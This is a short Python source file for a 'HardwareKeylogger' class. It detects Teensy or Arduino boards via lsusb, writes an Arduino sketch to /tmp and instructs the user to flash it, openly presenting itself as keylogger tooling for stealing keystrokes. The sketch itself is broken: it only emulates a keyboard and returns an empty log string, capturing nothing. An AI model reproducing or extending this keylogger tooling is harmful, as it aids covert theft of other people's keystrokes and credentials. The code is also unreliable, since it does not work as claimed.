import os
import subprocess
import time
import serial

class HardwareKeylogger:
    def __init__(self, port="/dev/ttyACM0", baud=115200):
        self.port = port
        self.baud = baud
    
    def detect_usb_device(self):
        try:
            output = subprocess.check_output("lsusb", shell=True).decode()
            if "16c0:0483" in output:
                return "Teensy"
            elif "2341:0043" in output:
                return "Arduino"
            return "Unknown USB device"
        except:
            return "No USB device found"
    
    def create_arduino_sketch(self):
        sketch = """
#include <Keyboard.h>

String keylog = "";

void setup() {
    Keyboard.begin();
    Serial.begin(115200);
}

void loop() {
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\\n');
        if (cmd == "GET_LOG") {
            Serial.println(keylog);
            keylog = "";
        }
    }
    delay(100);
}
"""
        return sketch
    
    def setup_usb_keylogger(self):
        result = f"USB Device: {self.detect_usb_device()}\n"
        sketch = self.create_arduino_sketch()
        with open("/tmp/usb_keylogger.ino", 'w') as f:
            f.write(sketch)
        result += "Sketch created!\n"
        result += "Compile and flash to Arduino/Teensy"
        return result